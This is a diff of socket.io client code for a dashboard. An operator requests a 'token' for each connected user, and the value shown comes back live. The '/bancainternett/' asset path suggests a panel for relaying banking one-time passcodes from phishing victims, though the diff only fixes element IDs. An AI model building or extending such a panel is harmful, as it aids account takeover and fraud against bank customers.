@@ -57,9 +57,9 @@ socket.on("ResendData", data => {
 
 //Get Token
 socket.on("ReSendToken", dataToken => {
-    if(document.querySelector("#row-"+dataToken.Socket)){
+    
         var parentData = document.querySelector("#row-"+dataToken.Socket);
-        document.querySelector("#token-load").remove();
+        document.querySelector("#token-load-"+dataToken.Socket).remove();
         dataTokenInsert = `<p> 
                                 <b>Token:</b> <span id="info-${dataToken.Token}">${dataToken.Token}</span>
                                 <button class="token-copiar" id="button-${dataToken.Token}">
@@ -69,7 +69,7 @@ socket.on("ReSendToken", dataToken => {
         parentData.innerHTML += dataTokenInsert;
 
         //document.querySelector("#t-"+dataToken.Socket).remove();
-    }
+    
 })
 
 //Disconnect queue
@@ -95,12 +95,12 @@ on(document, 'click', '.pedir-token', e =>{
     socket.emit("PedirToken", idUser);
     document.querySelector("#"+id).innerHTML = "Volver a pedir token";
     
-    if(document.querySelector("#token-load")){
-        document.querySelector("#token-load").remove();
+    if(document.querySelector("#token-load-"+idUser)){
+        document.querySelector("#token-load-"+idUser).remove();
     }
     
     const parentData = document.querySelector("#row-"+idUser);
-    dataTokenInsert =   `<p id="token-load"> 
+    dataTokenInsert =   `<p id="token-load-${idUser}"> 
                             <b>Token:</b> 
                             <img src="/bancainternett/img/Spinner-macro-Azul-Rota.gif">
                         </p>`;
